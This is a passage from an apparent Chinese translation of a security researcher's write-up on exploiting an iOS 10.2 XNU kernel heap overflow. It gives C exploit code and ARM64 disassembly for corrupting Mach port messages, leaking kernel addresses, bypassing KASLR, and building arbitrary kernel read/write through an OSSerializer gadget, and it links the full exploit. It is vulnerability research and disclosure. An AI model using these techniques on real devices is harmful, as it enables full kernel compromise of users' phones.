@@ -1,0 +1,148 @@
+该方法并非十分可靠；对于具有更多RAM的设备来说，您需要增加区耗尽循环的迭代次数。这不是一个完美的技术，但对于一个研究工具来说，效果非常好。
+我们现在可以释放holder端口，触发溢出，这将重用holder所在的槽并溢出到first_port，然后再使用另一个holder端口抓取这个槽：
+      // free the holder:
+      mach_port_destroy(mach_task_self(), holder);
+      // reallocate the holder and overflow out of it
+      uint64_t overflow_bytes[] = {0x1104,0,0,0,0,0,0,0};
+      do_overflow(0x1000, 64, overflow_bytes);
+      // grab the holder again
+      holder = prealloc_port(prealloc_size);
+溢出已将属于第一个端口的预先分配的ipc_kmsg的ikm_size字段更改为0x1104。
+ipc_kmsg结构由ipc_get_kmsg_from_kernel填写后，将通过ipc_kmsg_enqueue放入目标端口的待处理消息队列：
+    void ipc_kmsg_enqueue(ipc_kmsg_queue_t queue,
+                          ipc_kmsg_t       kmsg)
+    {
+      ipc_kmsg_t first = queue->ikmq_base;
+      ipc_kmsg_t last;
+      if (first == IKM_NULL) {
+        queue->ikmq_base = kmsg;
+        kmsg->ikm_next = kmsg;
+        kmsg->ikm_prev = kmsg;
+      } else {
+        last = first->ikm_prev;
+        kmsg->ikm_next = first;
+        kmsg->ikm_prev = last;
+        first->ikm_prev = kmsg;
+        last->ikm_next = kmsg;
+      }
+    }
+如果端口有挂起的消息，则ipc_kmsg的ikm_next和ikm_prev字段将指向挂起的消息的双向链接列表。但如果端口没有挂起的消息，那么ikm_next和ikm_prev都设置为指向本身的kmsg。下面我们使用这个事实来读回第二个ipc_kmsg缓冲区的地址：
+      uint64_t valid_header[] = {0xc40, 0, 0, 0, 0, 0, 0, 0};
+      send_prealloc_msg(first_port, valid_header, 8);
+      // send a message to the second port
+      // writing a pointer to itself in the prealloc buffer
+      send_prealloc_msg(second_port, valid_header, 8);
+      // receive on the first port, reading the header of the second:
+      uint64_t* buf = receive_prealloc_msg(first_port);
+      // this is the address of second port
+      kernel_buffer_base = buf[1];
+下面是send_prealloc_msg的实现：
+    void send_prealloc_msg(mach_port_t port, uint64_t* buf, int n) {
+      struct thread_args* args = malloc(sizeof(struct thread_args));
+      memset(args, 0, sizeof(struct thread_args));
+      memcpy(args->buf, buf, n*8);
+      args->exception_port = port;
+      // start a new thread passing it the buffer and the exception port
+      pthread_t t;
+      pthread_create(&t, NULL, do_thread, (void*)args);
+      // associate the pthread_t with the port 
+      // so that we can join the correct pthread
+      // when we receive the exception message and it exits:
+      kern_return_t err = mach_port_set_context(mach_task_self(),
+                                                port,
+                                                (mach_port_context_t)t);
+      // wait until the message has actually been sent:
+      while(!port_has_message(port)){;}
+    }
+请记住，要将受控数据导入端口预分配的ipc_kmsg中，我们需要内核向其发送异常消息，因此send_prealloc_msg必须导致该异常才行。它需要分配一个
+thread_args结构，其中包含在消息和目标端口中所需的受控数据的副本，然后启动将调用do_thread的新线程：
+    void* do_thread(void* arg) {
+      struct thread_args* args = (struct thread_args*)arg;
+      uint64_t buf[32];
+      memcpy(buf, args->buf, sizeof(buf));
+      kern_return_t err;
+      err = thread_set_exception_ports(mach_thread_self(),
+                                       EXC_MASK_ALL,
+                                       args->exception_port,
+                                       EXCEPTION_STATE,
+                                       ARM_THREAD_STATE64);
+      free(args);
+      load_regs_and_crash(buf);
+      return NULL;
+    }
+do_thread将受控数据从thread_args结构复制到本地缓冲区，然后将目标端口设置为该线程的异常处理程序。它会释放参数结构，然后调用load_regs_and_crash，它是一个简单的汇编器，用来将缓冲区的值复制到前30个ARM64通用寄存器中，并触发软件断点。
+此时内核的中断处理程序将调用exception_deliver，它将查找线程的异常端口并调用MIG
+mach_exception_raise_state方法，该方法会将崩溃的线程的寄存器状态序列化为MIG消息，并调用mach_msg_rpc_from_kernel_body，该脚本将抓取异常端口的预先分配的ipc_kmsg，并信任
+ikm_size字段，然后使用它将发送的消息与它认为的缓冲区结尾对齐：
+为了实际读取数据，我们需要接收异常消息。就这里来说，我们得到了内核向第一个端口发送的消息，这个端口会影响向第二个端口上写入的有效报头。为什么通过内存损坏原语利用它已有的相同数据来覆盖下一条消息的报头呢？
+请注意，如果我们发送消息并立即接收的话，就能读回来我们所写的内容。为了读回有用的东西，我们必须进行相应的修改。我们可以在将消息发送到第一个端口之后且接收消息之前向第二个端口发送消息。
+根据我之前的观察，如果一个端口的消息队列为空，当消息排队时，ikm_next字段将指向该消息本身。因此，通过向second_port发送消息（用一个使ipc_kmsg仍然有效且未被使用的内容覆盖它的报头），然后读回发送到第一个端口的消息，我们就能过确定第二个端口的ipc_kmsg缓冲区的地址。
+**从读/写到任意读/写**
+现在，我们已经使得堆溢出获取了可靠覆盖并读取first_port
+ipc_kmsg对象之后的240字节区域的内容的能力了，这正是我们想要的。我们也知道该内存区位于内核的虚拟地址空间中。最后一步是将其转化为具备读写任意内核内存的能力。
+虽然mach_portal漏洞利用代码可用于内核任务端口对象。但是，这一次我选择了一条不同的路径，主要是受到了Lookout
+writeup中详细描述的Pegasus漏洞利用代码中一个简洁技巧的启发。
+开发过这个漏洞利用代码的人都发现IOKit Serializer ::
+serialize方法是一个非常便捷的小工具，可以将通过一个指向受控数据的参数调用一个函数的能力，转换为可以使用两个完全受控的参数调用另一个受控函数的能力。
+为此，我们需要调用受控地址，将指针传递给受控数据。我们还需要知道OSSerializer :: serialize的地址。
+下面，我们释放second_port并重新分配一个IOKit用户客户端：
+      // send another message on first
+      // writing a valid, safe header back over second
+      send_prealloc_msg(first_port, valid_header, 8);
+      // free second and get it reallocated as a userclient:
+      mach_port_deallocate(mach_task_self(), second_port);
+      mach_port_destroy(mach_task_self(), second_port);
+      mach_port_t uc = alloc_userclient();
+      // read back the start of the userclient buffer:
+      buf = receive_prealloc_msg(first_port);
+      // save a copy of the original object:
+      memcpy(legit_object, buf, sizeof(legit_object));
+      // this is the vtable for AGXCommandQueue
+      uint64_t vtable = buf[0];
+alloc_userclient分配AGXAccelerator
+IOService的用户客户端类型为5，它是一个AGXCommandQueue对象。IOKit的默认运算符operator
+new使用kalloc，AGXCommandQueue是0xdb8字节，因此它也将使用kalloc.4096内存区，并重用由second_port
+ipc_kmsg释放的内存。
+请注意，我们发送了另一个消息，其中有一个对first_port有效的报头，它用一个有效的报头来覆盖second_port的报头。这就是说，在second_port被释放并且为用户客户端重新使用内存之后，我们可以从first_port读出消息，并读回到AGXCommandQueue对象的前240个字节中。第一个qword是指向AGXCommandQueue的vtable的指针，使用它可以确定KASLR
+slide，从而计算出OSSerializer :: serialize的地址。
+在AGXCommandQueue用户客户端上调用任何IOKit MIG方法可能会导致至少三个虚拟调用： 用户客户端口的MIG
+intran将通过iokit_lookup_connect_port调用:: retain（）。这个方法也调用::
+getMetaClass（）。最后，MIG包装器将调用iokit_remove_connect_reference，而它将调用:: release（）。
+由于这些都是C
+++虚拟方法，它们将作为第一个（隐含）参数传递这个指针，这意味着我们可以满足使用OSSerializer::serialize小工具所需条件了。让我们深入考察其工作原理：
+    class OSSerializer : public OSObject
+    {
+      OSDeclareDefaultStructors(OSSerializer)
+      void * target;
+      void * ref;
+      OSSerializerCallback callback;
+      virtual bool serialize(OSSerialize * serializer) const;
+    };
+    bool OSSerializer::serialize( OSSerialize * s ) const
+    {
+      return( (*callback)(target, ref, s) );
+    }
+如果看一下OSSerializer::serialize的反汇编代码，就清楚了发生了什么事：
+    ; OSSerializer::serialize(OSSerializer *__hidden this, OSSerialize *)
+    MOV  X8, X1
+    LDP  X1, X3, [X0,#0x18] ; load X1 from [X0+0x18] and X3 from [X0+0x20]
+    LDR  X9, [X0,#0x10]     ; load X9 from [X0+0x10]
+    MOV  X0, X9
+    MOV  X2, X8
+    BR   X3                 ; call [X0+0x20] with X0=[X0+0x10] and X1=[X0+0x18]
+由于我们对AGXCommandQueue用户客户端的前240个字节具有读/写权限，并且我们知道它在内存中的位置，所以我们可以使用以下伪造对象来替换它，该虚拟对象会将一个虚拟调用转换为一个任意函数指针的调用，并且带两个受控参数：
+我们已将vtable指针重定向到该对象，以便对所需vtable条目与数据进行相应的处理。我们现在还需要一个原语，将具有两个受控参数的任意函数调用转换为任意内存读/写。
+像copyin和copyout这样的函数都是不错的候选者，因为它们都能处理跨用户/内核边界的内存拷贝，但它们都有三个参数：源、目的地和大小，我们只能完全控制两个。
+然而，由于我们已经有能力从用户空间中读取和写入这个伪造对象，所以我们实际上可以将值拷贝到这个内核缓冲区中，而不必直接拷贝到用户空间。这意味着我们可以将搜索扩展到任何内存复制函数，如memcpy。当然，memcpy、memmove和bcopy都有三个参数，所以我们需要的是一个传递固定大小的封装器。
+查看这些函数的交叉引用，我们发现了uuid_copy：
+    ; uuid_copy(uuid_t dst, const uuid_t src)
+    MOV  W2, #0x10 ; size
+    B    _memmove
+这个函数只是简单的封装memmove，使其总是传递固定大小的16字节。让我们将最终的原始数据整合到序列化器小工具中：
+为了使把读操作变成写操作，我们只要交换参数的顺序，从任意地址拷贝到我们的伪用户客户端对象中，然后接收异常消息来读取读出数据。
+您可以在iPod 6G上下载我的iOS 10.2的漏洞利用代码： https://bugs.chromium.org/p/project-zero/issues/detail?id=1004#c4
+这个漏洞也是由Marco
+Grassi和qwertyoruiopz独立发现和利用的，检查他们的代码可以看到，他们使用了一个不同的方法来利用这个漏洞，不过也使用了mach端口。
+**结语**
+每个开发人员都会犯错误，并且它们是软件开发过程的一个自然部分。然而，运行XNU的1B
++设备上的全新内核代码值得特别注意。在我看来，这个错误是苹果代码审查流程的明显失职，我希望漏洞和这类报道应该认真对待，并从中学到一些经验教训。
